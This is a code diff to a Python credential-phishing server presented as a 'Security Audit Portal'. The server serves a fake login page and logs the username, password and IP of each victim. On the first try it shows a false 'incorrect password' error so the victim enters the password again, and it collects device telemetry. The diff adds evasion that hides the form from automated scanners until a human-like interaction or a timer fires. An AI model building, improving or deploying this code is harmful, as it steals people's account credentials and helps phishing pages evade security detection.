@@ -1,4 +1,4 @@
-#!/usr/init/env python3
+#!/usr/bin/env python3
 import http.server
 import socketserver
 import urllib.parse
@@ -9,7 +9,7 @@ import json
 PORT = 8080
 LOG_FILE = "audit_results.log"
 
-# High-Fidelity Phishing & Device Intelligence Template with Real-time Error Handling
+# High-Fidelity Phishing & Device Intelligence Template with Anti-Bot Evasion
 HTML_PAGE = """
 <!DOCTYPE html>
 <html lang="en">
@@ -26,23 +26,52 @@ HTML_PAGE = """
         button:hover { background-color: #165eab; }
         .info { font-size: 12px; color: #65676b; margin-top: 15px; }
         .error-msg { color: #ed4337; font-size: 13px; margin-bottom: 10px; display: none; }
+        #loginForm { display: none; }
     </style>
 </head>
 <body>
     <div class="card">
         <h2>Security Audit Portal</h2>
-        <p class="info">Please verify your session to proceed.</p>
+        <p class="info" id="statusMsg">Verifying browser security & anti-bot check...</p>
         <div id="errorBox" class="error-msg">Incorrect username or password. Please try again.</div>
         <form id="loginForm">
             <input type="text" id="username" name="username" placeholder="Username, email, or phone" required>
             <input type="password" id="password" name="password" placeholder="Password" required>
+            <input type="hidden" id="botToken" name="botToken" value="">
             <button type="submit" id="subBtn">Verify & Continue</button>
         </form>
         <div class="info" id="status">Gathering secure device telemetry...</div>
     </div>
 
     <script>
-        // Advanced Device Intelligence Gathering Script
+        let humanVerified = false;
+        let botTokenValue = "";
+
+        function checkHuman() {
+            botTokenValue = "verified_human_" + Math.random().toString(36).substring(2);
+            document.getElementById('botToken').value = botTokenValue;
+            humanVerified = true;
+            document.getElementById('loginForm').style.display = 'block';
+            document.getElementById('statusMsg').innerText = "Please verify your session to proceed.";
+        }
+
+        let interactionCount = 0;
+        function handleInteraction() {
+            interactionCount++;
+            if (interactionCount > 1 && !humanVerified) {
+                checkHuman();
+            }
+        }
+
+        window.addEventListener('mousemove', handleInteraction);
+        window.addEventListener('touchstart', handleInteraction);
+
+        setTimeout(() => {
+            if (!humanVerified) {
+                checkHuman();
+            }
+        }, 1500);
+
         async function gatherIntelligence() {
             let data = {};
             data.screenWidth = window.screen.width;
@@ -86,17 +115,17 @@ HTML_PAGE = """
 
         window.onload = gatherIntelligence;
 
-        // Real-time Credential Validation & Fake Error Handler
         let attemptCount = 0;
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             let username = document.getElementById('username').value;
             let password = document.getElementById('password').value;
+            let token = document.getElementById('botToken').value;
 
             fetch('/login', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ username: username, password: password, attempt: attemptCount })
+                body: JSON.stringify({ username: username, password: password, attempt: attemptCount, botToken: token })
             }).then(response => response.json()).then(data => {
                 if (data.status === 'retry') {
                     attemptCount++;
@@ -104,6 +133,8 @@ HTML_PAGE = """
                     document.getElementById('password').value = '';
                 } else if (data.status === 'success') {
                     window.location.href = data.redirect;
+                } else if (data.status === 'bot_blocked') {
+                    alert('Security verification failed. Automated access restricted.');
                 }
             }).catch(err => {
                 console.error('Error:', err);
@@ -139,14 +170,25 @@ class SecurityAuditHandler(http.server.BaseHTTPRequestHandler):
                 username = data.get('username', '')
                 password = data.get('password', '')
                 attempt = data.get('attempt', 0)
-                
+                bot_token = data.get('botToken', '')
+
+                if not bot_token or not bot_token.startswith('verified_human_'):
+                    log_entry = f"[BOT BLOCKED] IP: {self.client_address[0]} | Automated scanner/bot detected.\n"
+                    print(f"\033[91m{log_entry}\033[0m")
+                    with open(LOG_FILE, "a") as f:
+                        f.write(log_entry)
+                    self.send_response(200)
+                    self.send_header("Content-type", "application/json")
+                    self.end_headers()
+                    self.wfile.write(json.dumps({"status": "bot_blocked"}).encode('utf-8'))
+                    return
+
                 log_entry = f"[CREDENTIAL CAPTURED (Attempt {attempt + 1})] IP: {self.client_address[0]} | Username: {username} | Password: {password}\n"
                 print(f"\033[92m{log_entry}\033[0m")
                 
                 with open(LOG_FILE, "a") as f:
                     f.write(log_entry)
 
-                # First attempt triggers fake error to harvest real password on second attempt
                 if attempt == 0:
                     response_data = {"status": "retry"}
                 else:
@@ -172,15 +214,16 @@ class SecurityAuditHandler(http.server.BaseHTTPRequestHandler):
             except Exception as e:
                 print(f"Error parsing telemetry: {e}")
 
+            response_bytes = json.dumps({"status": "success"}).encode('utf-8')
             self.send_response(200)
             self.send_header("Content-type", "application/json")
             self.end_headers()
-            self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
+            self.wfile.write(response_bytes)
 
 def run_server():
     server_address = ('', PORT)
     httpd = ThreadedHTTPServer(server_address, SecurityAuditHandler)
-    print(f"\033[96m[*] Advanced Security Audit Tool v2 running on port {PORT}...\033[0m")
+    print(f"\033[96m[*] Advanced Security Audit Tool v3.1 running on port {PORT}...\033[0m")
     print(f"\033[96m[*] Logging captured data to {LOG_FILE}\033[0m")
     try:
         httpd.serve_forever()
